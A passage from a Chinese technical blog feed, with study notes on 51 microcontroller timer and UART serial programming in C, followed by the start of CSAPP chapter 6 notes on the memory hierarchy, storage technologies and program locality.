class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*timer0.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Timer0Init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">TMOD|=<span class="number">0X01</span>;<span class="comment">//选择为定时器 0 模式，工作方式 1</span></span><br><span class="line">TH0=<span class="number">0XFC</span>; <span class="comment">//给定时器赋初值，定时 1ms</span></span><br><span class="line">TL0=<span class="number">0X18</span>; <span class="comment">//给定时器赋初值，定时 1ms</span></span><br><span class="line">ET0=<span class="number">1</span>;<span class="comment">//打开定时器 0 中断允许</span></span><br><span class="line">EA=<span class="number">1</span>;<span class="comment">//打开总中断</span></span><br><span class="line">TR0=<span class="number">1</span>;<span class="comment">//打开定时器</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//详看普中51单片机开发攻略第21章与19章</span></span><br><span class="line"><span class="comment">/*timer0.c*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;LCD1602.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Timer0.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Sec=<span class="number">14</span>,Min=<span class="number">45</span>,Hour=<span class="number">11</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">LCD_Init();</span><br><span class="line">Timer0Init();</span><br><span class="line"></span><br><span class="line">LCD_ShowString(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;Clock:&quot;</span>);</span><br><span class="line">LCD_ShowString(<span class="number">1</span>,<span class="number">8</span>,<span class="string">&quot;  :  :&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LCD_ShowNum(<span class="number">1</span>,<span class="number">8</span>,Hour,<span class="number">2</span>);</span><br><span class="line">LCD_ShowNum(<span class="number">1</span>,<span class="number">11</span>,Min,<span class="number">2</span>);</span><br><span class="line">LCD_ShowNum(<span class="number">1</span>,<span class="number">14</span>,Sec,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Timer0_Routine</span><span class="params">()</span> interrupt 1</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> T0Count;</span><br><span class="line">    TL0 = <span class="number">0x18</span>;</span><br><span class="line">TH0 = <span class="number">0xFC</span>;<span class="comment">//重新设置定时初值</span></span><br><span class="line">T0Count++;</span><br><span class="line"><span class="keyword">if</span>(T0Count&gt;=<span class="number">1000</span>)<span class="comment">//定时器分频，1s</span></span><br><span class="line">&#123;</span><br><span class="line">T0Count=<span class="number">0</span>;</span><br><span class="line">Sec++;<span class="comment">//1秒到，Sec自增</span></span><br><span class="line"><span class="keyword">if</span>(Sec&gt;=<span class="number">60</span>)</span><br><span class="line">&#123;</span><br><span class="line">Sec=<span class="number">0</span>;<span class="comment">//60秒到，Sec清0，Min自增</span></span><br><span class="line">Min++;</span><br><span class="line"><span class="keyword">if</span>(Min&gt;=<span class="number">60</span>)</span><br><span class="line">&#123;</span><br><span class="line">Min=<span class="number">0</span>;<span class="comment">//60分钟到，Min清0，Hour自增</span></span><br><span class="line">Hour++;</span><br><span class="line"><span class="keyword">if</span>(Hour&gt;=<span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line">Hour=<span class="number">0</span>;<span class="comment">//24小时到，Hour清0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*main.c*/</span></span><br></pre></td></tr></table></figure><h3 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h3><ul><li>串口是一种应用十分广泛的通讯接口，串口成本低、容易使用、通信线路简单，可实现两个设备的互相通信。</li><li>串行通信是指使用一条数据线，将数据一位一位地依次传输，每一位数据占据一个固定的时间长度。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240207134936370.png" alt="image-20240207134936370"></p><h4 id="电平标准"><a href="#电平标准" class="headerlink" title="电平标准"></a>电平标准</h4><ul><li><p>电平标准是数据1和数据0的表达方式，是传输线缆中人为规定的电压与数据的对应关系，串口常用的电平标准有如下三种：</p></li><li><p>TTL电平：+5V表示1，0V表示0</p></li><li><p>RS232电平：-3-15V表示1，+3~+15V表示0</p></li><li><p>RS485电平：两线压差+2+6V表示1，-2-6V表示0（差分信号）</p></li></ul><h4 id="通信术语"><a href="#通信术语" class="headerlink" title="通信术语"></a>通信术语</h4><ul><li><p>全双工：通信双方可以在同一时刻互相传输数据</p></li><li><p>半双工：通信双方可以互相传输数据，但必须分时复用一根数据线</p></li><li><p>单工：通信只能有一方发送到另一方，不能反向传输</p></li><li><p>异步：通信双方各自约定通信速率</p></li><li><p>同步：通信双方靠一根时钟线来约定通信速率</p></li><li><p>总线：连接各个设备的数据传输线路（类似于一条马路，把路边各住户连接起来，使住户可以相互交流）</p></li></ul><h4 id="常见通信接口"><a href="#常见通信接口" class="headerlink" title="常见通信接口"></a>常见通信接口</h4><div class="table-container"><table><thead><tr><th><strong>名称</strong></th><th><strong>引脚定义</strong></th><th><strong>通信方式</strong></th><th><strong>特点</strong></th></tr></thead><tbody><tr><td>UART</td><td>TXD、RXD</td><td>全双工、异步</td><td>点对点通信</td></tr><tr><td>I²C</td><td>SCL、SDA</td><td>半双工、同步</td><td>可挂载多个设备</td></tr><tr><td>SPI</td><td>SCLK、MOSI、MISO、CS</td><td>全双工、同步</td><td>可挂载多个设备</td></tr><tr><td>1-Wire</td><td>DQ</td><td>半双工、异步</td><td>可挂载多个设备</td></tr></tbody></table></div><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240225155359895.png" alt="image-20240225155359895"></p><ul><li><p>波特率：串口通信的速率（发送和接收各数据位的间隔时间）</p></li><li><p>检验位：用于数据验证</p></li><li><p>停止位：用于数据帧间隔</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240207170848460.png" alt="image-20240207170848460"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;UART.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">UART_Init();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UART_Routine</span><span class="params">()</span>interrupt 4</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(RI == <span class="number">1</span>)<span class="comment">//判断接收</span></span><br><span class="line">&#123;</span><br><span class="line">P2=SBUF;</span><br><span class="line">UART_SendByte(SBUF);</span><br><span class="line">RI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*UART.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">UART_Init</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//4800bps@12.000MHz</span></span><br><span class="line">&#123;</span><br><span class="line">PCON |= <span class="number">0x80</span>;<span class="comment">//使能波特率倍速位SMOD</span></span><br><span class="line">SCON = <span class="number">0x50</span>;  <span class="comment">//8位数据,可变波特率 </span></span><br><span class="line">TMOD &amp;= <span class="number">0x0F</span>;<span class="comment">//设置定时器模式</span></span><br><span class="line">TMOD |= <span class="number">0x20</span>;<span class="comment">//设置定时器模式</span></span><br><span class="line">TL1 = <span class="number">0xF4</span>;<span class="comment">//设置定时初始值</span></span><br><span class="line">TH1 = <span class="number">0xF4</span>;<span class="comment">//设置定时重载值</span></span><br><span class="line">ET1 = <span class="number">0</span>;<span class="comment">//禁止定时器中断</span></span><br><span class="line">TR1 = <span class="number">1</span>;<span class="comment">//定时器1开始计时</span></span><br><span class="line">EA = <span class="number">1</span>;<span class="comment">//开放中断，接受数据开启</span></span><br><span class="line">ES = <span class="number">1</span>;<span class="comment">//允许串行口中断，接受数据开启</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UART_SendByte</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Byte)</span></span><br><span class="line">&#123;</span><br><span class="line">SBUF = Byte;<span class="comment">//写入寄存器</span></span><br><span class="line"><span class="keyword">while</span>(TI == <span class="number">0</span>);</span><br><span class="line">TI = <span class="number">0</span>;  <span class="comment">//重置接收中断请求标志位。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模板</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void UART_Routine()interrupt 4</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">if(RI == 1)//判断接收</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">P2=SBUF;</span></span><br><span class="line"><span class="comment">RI=0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*UART.c*/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 单片机 </category>
          
          <category> 51单片机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单片机 </tag>
            
            <tag> 51单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp第六章——存储器层次结构</title>
      <link href="/2024/02/01/csapp/%E7%AC%AC6%E7%AB%A0%E2%80%94%E2%80%94%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"/>
      <url>/2024/02/01/csapp/%E7%AC%AC6%E7%AB%A0%E2%80%94%E2%80%94%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h1><p>计算机技术的成功很大程度上源自于存储技术的巨大进步 。</p><h3 id="随机访问存储器"><a href="#随机访问存储器" class="headerlink" title="随机访问存储器"></a>随机访问存储器</h3><h4 id="静态RAM"><a href="#静态RAM" class="headerlink" title="静态RAM"></a>静态RAM</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201205902876.png" alt="image-20240201205902876"></p><p>由于 <code>SRAM</code> 存储器单元的双稳态特性，只要有电，它就会永远地保持它的值。</p><h4 id="动态RAM"><a href="#动态RAM" class="headerlink" title="动态RAM"></a>动态RAM</h4><p>DRAM 将每个位存储为对每个电容的充电。与 SRAM 不同， DRAM 存储器单元对干扰非常敏感 。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201210226240.png" alt="image-20240201210226240"></p><h4 id="传统的DRAM"><a href="#传统的DRAM" class="headerlink" title="传统的DRAM"></a>传统的DRAM</h4><p>DRAM 芯片中的单元（位）被分成d 个超单元 (supercell) , 每个超单元都个DRAM单元组成。 d*w 的DRAM 总共存储了d w位信息。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201210456088.png" alt="image-20240201210456088"></p><p>图示为168 DRAM 芯片的组织，有 d=l6 个超单元，每个超单元有 w=8 位， r=4 行，c=4 。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201220810834.png" alt="image-20240201220810834"></p><ul><li><p>将 DRAM 组织成二维阵列而不是线性数组的一个原因是降低芯片上地址引脚的数量。</p></li><li><p>二维阵列组织的缺点是必须分两步发送地址，这增加了访问时间。</p></li></ul><h4 id="内存模块"><a href="#内存模块" class="headerlink" title="内存模块"></a>内存模块</h4><p>DRAM 芯片封装在内存模块 (memory module) 中，它插到主板的扩展槽上 。</p><p>内存控制器将超单元地址 发送到内存模块，然后内存模块再广播到每个 DRAM 。作为响应，每个DRAM 输出它的超单元的8位内容。模块中的电路收集这些输出，并把它们合并成64 位字，再返回给内存控制器。</p><p>将多个内存模块连接到内存控制器，能够聚合成主存。<img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201221228731.png" alt="image-20240201221228731"></p><p>这也是为什么16GB板载内存被分为8*2GB小内存的原因</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201221933534.png" alt="image-20240201221933534"></p><h4 id="增强的DRAM"><a href="#增强的DRAM" class="headerlink" title="增强的DRAM"></a>增强的DRAM</h4><ul><li>快页模式 DRAM(Fast Page Mode DRAM, FPM DRAM) </li></ul><p>若第四个超单元来自同一行，那么的第一个发送RAS/CAS请求，后面三个超单元发送CAS请求，直接从行缓冲区获得。</p><ul><li>扩展数据输出 DRAM(Extended Data Out DRAM, EDO DRAM)</li></ul><p>FPM DRAM一个增强的形式，它允许各个 CAS 信号在时间上靠得更紧密一点。</p><ul><li><p>同步 DRAM(Synchronous DRAM, SDRAM) 。</p><p>SDRAM 能够比那些异步的存储器更快地输出它的超单元的内容。</p></li><li><p>双倍数据速率同步 DRAM (Double Data-Rate Synchronous DRAM, DDR SDRAM)</p></li></ul><p>它通过使用两个时钟沿作为控制信号，从而使 DRAM 的速度翻倍,不同类型的 DDR SDRAM 是用提高有效带宽的很小的预取缓冲区的大小来划分的： DDR(2 位）、 DDR2(4 位）和 DDR(8 位）</p><ul><li>视频 RAM(Video RAM, VRAM) </li></ul><p>它用在图形系统的帧缓冲区中。</p><h4 id="非易失性存储器"><a href="#非易失性存储器" class="headerlink" title="非易失性存储器"></a>非易失性存储器</h4><p>非易失性存储器 (nonvolatile memory) 即使是在关电后，仍然保存着它们的信息 。</p><h4 id="访问主存"><a href="#访问主存" class="headerlink" title="访问主存"></a>访问主存</h4><p>数据流通过称为总线 (bus) 的共享电子电路在处理器和 DRAM 存之间来来回回。</p><p>其中一条总线是<code>系统总线 (system bus)</code>, 它连接 CPU和I/0 桥接器，另一条总线是内<code>存总线 (memory bus)</code>, 它连接 I/0 桥接器和主存，I/O桥接器将系统总线的电子信号翻译成内存总线的电子信号。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205205403294.png" alt="image-20240205205403294"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205210231874.png" alt="image-20240205210231874"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205210125807.png" alt="image-20240205210125807"></p><h3 id="磁盘存储"><a href="#磁盘存储" class="headerlink" title="磁盘存储"></a>磁盘存储</h3><h4 id="磁盘构造"><a href="#磁盘构造" class="headerlink" title="磁盘构造"></a>磁盘构造</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205210332028.png" alt="image-20240205210332028"></p><ul><li>磁盘是由<code>盘片 (platter)</code> 构成的。每个盘片(表面)有两面, 表面覆盖着磁性记录材料。</li><li>盘面中央有个可以旋转的<code>主轴 (spindle)</code>。</li><li>每个表面是由一组称为<code>磁道 (track)</code> 的同心圆组成的。</li><li>每个磁道被划分为一组<code>扇区 (sector)</code>。每个扇区包含相等数量的数据位（通常512 字节），这些数据编码在扇区上的磁性材料中。</li><li>扇区之间由一些间隙 (gap) 分隔开，这些间隙中不存储数据。间隙存储用来标识扇区的格式化位。</li><li>磁盘是 一个或多个叠放在一起 的盘片组成的，它们被封装在 一个密封的包装里，整个装置通常被称为<code>磁盘驱动器 (disk drive)</code>, 我们通常简称为<code>磁盘 (disk)</code>。</li><li><code>柱面(cylinder)</code>是所有盘片表面上到主轴中心的距离相等的磁道的集合。</li></ul><h4 id="磁盘容量"><a href="#磁盘容量" class="headerlink" title="磁盘容量"></a>磁盘容量</h4><ul><li><p>记录密度 (recording density) (位/英寸）：磁道一英寸的段中可以放入的位数。 </p></li><li><p>磁道密度 (track density)( 道/英寸）：从盘片中心出发半径上一英寸的段内可以放入的磁道数。</p></li><li>面密度 (areal density) (位/平方英寸）：记录密度与磁道密度的乘积。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205211057271.png" alt="image-20240205211057271"></p><h4 id="磁盘操作"><a href="#磁盘操作" class="headerlink" title="磁盘操作"></a>磁盘操作</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205211939780.png" alt="image-20240205211939780"></p><ul><li>通过沿着半径轴前后移动这个传动臂，驱动器可以将读/写头定位在盘面上的任何磁道上。这样的机械运动称为寻道 (seek) 。</li><li>在任何时刻，所有的读/写头都位于同一个柱面上。</li></ul><p>访问时间 (access time) 有三个主要的部分：</p><ol><li><code>寻道时间</code>：为了读取某个目标扇区的内容，传动臂首先将读/写头定位到包含目标扇区的磁道上。移动传动臂所需的时间称为寻道时间。寻道时间依赖于读/写头以前的位置和传动臂在盘面上移动的速度。</li><li><code>旋转时间</code>：一旦读/写头定位到了期望的磁道，驱动器等待目标扇区的第一个位旋转到读/写头下。这个步骤的性能依赖于当读/写头到达目标扇区时盘面的位置以及磁盘的旋转速度。在最坏的情况下，读/写头刚刚错过了目标扇区，必须等待磁盘转一整圈。</li><li><code>传送时间</code>：当目标扇区的第一个位位于读/写头下时，驱动器就可以开始读或者写该扇区的内容了。 一个扇区的传送时间依赖于旋转速度和每条磁道的扇区数目。</li></ol><h4 id="逻辑磁盘块"><a href="#逻辑磁盘块" class="headerlink" title="逻辑磁盘块"></a>逻辑磁盘块</h4><p>磁盘封装中有一个小的硬件/固件设备，称为磁盘控制器，维护着逻辑块号和实际（物理）磁盘扇区之间的映射关系。</p><h4 id="连接I-O设备"><a href="#连接I-O设备" class="headerlink" title="连接I/O设备"></a>连接I/O设备</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205213744503.png" alt="image-20240205213744503"></p><ul><li><p><code>通用串行总线 (Universal Serial Bus, USB) 控制器</code>是一个连接到 USB 总线的设备的中转机构， </p></li><li><p><code>图形卡（或适配器）</code>包含硬件和软件逻辑，它们负责代表 CPU 在显示器上画像素。</p></li><li><p><code>主机总线适配器</code>将一个或多个磁盘连接到总线，使用的是一个特别的主线总线接口定义的通信协议。</p><p>两个最常用的这样的磁盘接口是SATA和SCSI</p></li></ul><h4 id="访问磁盘"><a href="#访问磁盘" class="headerlink" title="访问磁盘"></a>访问磁盘</h4><p>CPU使用一种称为<code>内存映射</code> (memory-mapped I/0) 的技术来向 I/0 设备发射命令</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205215250941.png" alt="image-20240205215250941"></p><ol><li>CPU 发出了请求之后，在磁盘执行读的时候，它通常会做些其他的工作。</li><li>在磁盘控制器收到来自 CPU 的读命令之后，它将逻辑块号翻译成一个扇区地址，读该扇区的内容，然后将这些内容直接传送到主存，不需要 CPU 的干涉。设备可以自己执行读或者写总线事务而不需要 CPU 干涉的过程，称为<code>直接内存访问 (Direct Memory Access, DMA)</code> 。这种数据传送称为<code>DMA 传送 (DMA transfer)</code>。</li><li>DMA 传送完成，磁盘扇区的内容被安全地存储在主存中以后，磁盘控制器通过给CPU 发送一个中断信号来通知 CPU。</li></ol><h3 id="固态硬盘"><a href="#固态硬盘" class="headerlink" title="固态硬盘"></a>固态硬盘</h3><ul><li><p>固态硬盘 (Solid State Disk , SSD) 种基于闪存的存储技术。</p></li><li><p>一个 SSD 封装由一个或多个<code>闪存芯片</code>和<code>闪存翻译层 (flash translation layer)</code>组成。</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205220637797.png" alt="image-20240205220637797"></p><ul><li><p><code>读 SSD 比写要快</code>。随机读和写的性能别是由底层闪存基本属性决定的。</p></li><li><p>一个闪存由B个块的序列组成，每个块由P页组成。</p></li><li><p>数据是以页为单位读写的。只有在一页所属的块整个被擦除之后，才能写这一页（通常是指该块中的所有位都被设置为 1) 。</p></li><li>随机写很慢有两个原因：（1）擦除块需要相对较长的时间。（2）如果试图修改一个巳经有数据（也就是不是全为 1) 的页p, 那么这个块中所有带有用数据的页都必须被复制到一个新（擦除过的）块，然后才能进行对页写。</li><li>闪存翻译层中的平均磨损 (wear leveling) 逻辑试图通过将擦除平均分布在所有的块上来最大化每个块的寿命。</li></ul><h4 id="存储技术趋势"><a href="#存储技术趋势" class="headerlink" title="存储技术趋势"></a>存储技术趋势</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205222326800.png" alt="image-20240205222326800"></p><ul><li><p>增加密度（从而降低成本）比降低访问时间容易得多。</p></li><li><p>DRAM 和磁盘的性能滞后于 CPU 的性能。</p></li></ul><h3 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h3><p>一个编写良好的计 程序常常具有良好的局部性 (locality) 。也就是，它们倾向于引用邻近于其他最近引用过的数据项的数据项，或者最近引用过的数据项本身。</p><p>时间局部性 (temporal locality) 和空间局部性 (spatial locality): </p><ul><li><p>时间局部性：被引用过一次的内存位置很可能在不远的将来再被多次引用 </p></li><li><p>空间局部性：如果一个内存位被引用了一次，那么程序很可能在不远的将来引用附近的 一个内存位置。</p></li></ul><h4 id="对程序数据引用的局部性"><a href="#对程序数据引用的局部性" class="headerlink" title="对程序数据引用的局部性"></a>对程序数据引用的局部性</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sumvec</span><span class="params">(<span class="type">int</span> v[N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        sum += v[i];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>变量sum 在每次循环迭代中被引用一次，因此，对于 sum 来说，有好的时间局部性。另一方面，因为 sum是标量 ，对于 sum 来说，没有空间局部性。</li><li>对于变量v，函数有很好的空间局部性，但是时间局部性很差，因为每个向量元素只被访问一次。</li></ul><p>我们说像 <code>sumvec</code>这样顺序访问一个向最每个元素的函数，具有步长为1 的<code>引用模式(stride-I reference pattern) (相对于元素的大小）</code>。有时我们称步长为1的引用模式为<code>顺序引用模式 (sequential reference pattern)</code> 。一个连续向量中，每隔 k个元素进行访问，就称为步长为k的引用模式 (stride-k reference pattern) 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sumarrayrows</span><span class="params">(<span class="type">int</span> a[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">            sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sumarraycols</code>按照数组被存储的行优先顺序来访问这个数组。其结果是得到一个很好的步长为1 的引用模式，具有良好的空间局部性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sumarraycols</span><span class="params">(<span class="type">int</span> a[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">            sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sumarraycols</code>步长为 N的引用模式,空间局部性很差。</p><h4 id="取指令的局部性"><a href="#取指令的局部性" class="headerlink" title="取指令的局部性"></a>取指令的局部性</h4><p>for 循环体里的指令是按照连续的内存顺序执行的，因此循环有良好的空间局部性。因为循环体会被执行多次，所以它也有很好的时间局部性。</p><h4 id="局部性小结"><a href="#局部性小结" class="headerlink" title="局部性小结"></a>局部性小结</h4><ul><li>重复引用相同变量的程序有良好的时间局部性。</li><li>对于具有步长为k的引用模式的程序，步长越小，空间局部性越好。具有步长为l的引用模式的程序有很好的空间局部性。在内存中以大步长跳来跳去的程序空间局部性会很差。</li><li>对于取指令来说，循环有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</li></ul><h3 id="存储器层次结构-1"><a href="#存储器层次结构-1" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240205222847968.png" alt="image-20240205222847968"></p><h4 id="存储器层次结构中的缓存"><a href="#存储器层次结构中的缓存" class="headerlink" 